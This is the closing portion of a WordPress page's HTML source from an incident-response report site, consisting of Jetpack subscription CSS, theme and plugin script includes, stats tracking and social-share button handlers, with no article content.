p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email{background:#0000;flex-grow:1}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email input[type=email]{height:auto;margin:0;width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-submit,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-submit{line-height:0;margin:0;padding:0}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__show-subs .wp-block-jetpack-subscriptions__subscount{font-size:16px;margin:8px 0;text-align:end}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__form-elements{display:block}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline button{display:inline-block;max-width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__subscount{text-align:start}#subscribe-submit.is-link{text-align:center;width:auto!important}#subscribe-submit.is-link a{margin-left:0!important;margin-top:0!important;width:auto!important}@keyframes jetpack-memberships_button__spinner-animation{to{transform:rotate(1turn)}}.jetpack-memberships-spinner{display:none;height:1em;margin:0 0 0 5px;width:1em}.jetpack-memberships-spinner svg{height:100%;margin-bottom:-2px;width:100%}.jetpack-memberships-spinner-rotating{animation:jetpack-memberships_button__spinner-animation .75s linear infinite;transform-origin:center}.is-loading .jetpack-memberships-spinner{display:inline-block}body.jetpack-memberships-modal-open{overflow:hidden}dialog.jetpack-memberships-modal{opacity:1}dialog.jetpack-memberships-modal,dialog.jetpack-memberships-modal iframe{background:#0000;border:0;bottom:0;box-shadow:none;height:100%;left:0;margin:0;padding:0;position:fixed;right:0;top:0;width:100%}dialog.jetpack-memberships-modal::backdrop{background-color:#000;opacity:.7;transition:opacity .2s ease-out}dialog.jetpack-memberships-modal.is-loading,dialog.jetpack-memberships-modal.is-loading::backdrop{opacity:0}
</style>
<script type="a047e49feedfc240b75aad7c-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/navigation.min.js?ver=6.6.2" id="freenews-navigation-js"></script>
<script type="a047e49feedfc240b75aad7c-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/skip-link-focus-fix.js?ver=6.6.2" id="freenews-skip-link-focus-fix-js"></script>
<script type="a047e49feedfc240b75aad7c-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/ResizeSensor.min.js?ver=6.6.2" id="ResizeSensor-js"></script>
<script type="a047e49feedfc240b75aad7c-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/theia-sticky-sidebar.min.js?ver=6.6.2" id="theia-sticky-sidebar-js"></script>
<script type="a047e49feedfc240b75aad7c-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick.min.js?ver=6.6.2" id="slick-js"></script>
<script type="a047e49feedfc240b75aad7c-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick-settings.js?ver=6.6.2" id="freenews-slick-settings-js"></script>
<script type="a047e49feedfc240b75aad7c-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/jquery.sticky.js?ver=6.6.2" id="jquery-sticky-js"></script>
<script type="a047e49feedfc240b75aad7c-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/sticky-setting.js?ver=6.6.2" id="freenews-sticky-settings-js"></script>
<script type="a047e49feedfc240b75aad7c-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/jquery.marquee.min.js?ver=6.6.2" id="marquee-js"></script>
<script type="a047e49feedfc240b75aad7c-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/marquee-settings.js?ver=6.6.2" id="freenews-marquee-settings-js"></script>
<script type="a047e49feedfc240b75aad7c-text/javascript" src="https://stats.wp.com/e-202443.js" id="jetpack-stats-js" data-wp-strategy="defer"></script>
<script type="a047e49feedfc240b75aad7c-text/javascript" id="jetpack-stats-js-after">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"175340963\",\"post\":\"28305\",\"tz\":\"0\",\"srv\":\"thedfirreport.com\",\"j\":\"1:13.9.1\"}") ]);
_stq.push([ "clickTrackerInit", "175340963", "28305" ]);
/* ]]> */
</script>
<script type="a047e49feedfc240b75aad7c-text/javascript" id="google-translate-init-js-extra">
/* <![CDATA[ */
var _wp_google_translate_widget = {"lang":"en_US","layout":"0"};
/* ]]> */
</script>
<script type="a047e49feedfc240b75aad7c-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/widgets/google-translate/google-translate.min.js" id="google-translate-init-js"></script>
<script type="a047e49feedfc240b75aad7c-text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit&amp;ver=13.9.1" id="google-translate-js"></script>
<script type="a047e49feedfc240b75aad7c-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/dist/vendor/wp-polyfill.min.js" id="wp-polyfill-js"></script>
<script type="a047e49feedfc240b75aad7c-text/javascript" id="jetpack-blocks-assets-base-url-js-before">
/* <![CDATA[ */
var Jetpack_Block_Assets_Base_Url="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/";
/* ]]> */
</script>
<script type="a047e49feedfc240b75aad7c-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/dist/dom-ready.min.js" id="wp-dom-ready-js"></script>
<script type="a047e49feedfc240b75aad7c-text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/subscriptions/view.js?minify=false&amp;ver=13.9.1" id="jetpack-block-subscriptions-js"></script>
<script type="a047e49feedfc240b75aad7c-text/javascript" id="sharing-js-js-extra">
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type="a047e49feedfc240b75aad7c-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/sharedaddy/sharing.min.js" id="sharing-js-js"></script>
<script type="a047e49feedfc240b75aad7c-text/javascript" id="sharing-js-js-after">
/* <![CDATA[ */
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-linkedin' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-linkedin' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
/* ]]> */
</script>

<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="a047e49feedfc240b75aad7c-|49" defer></script></body>
</html>
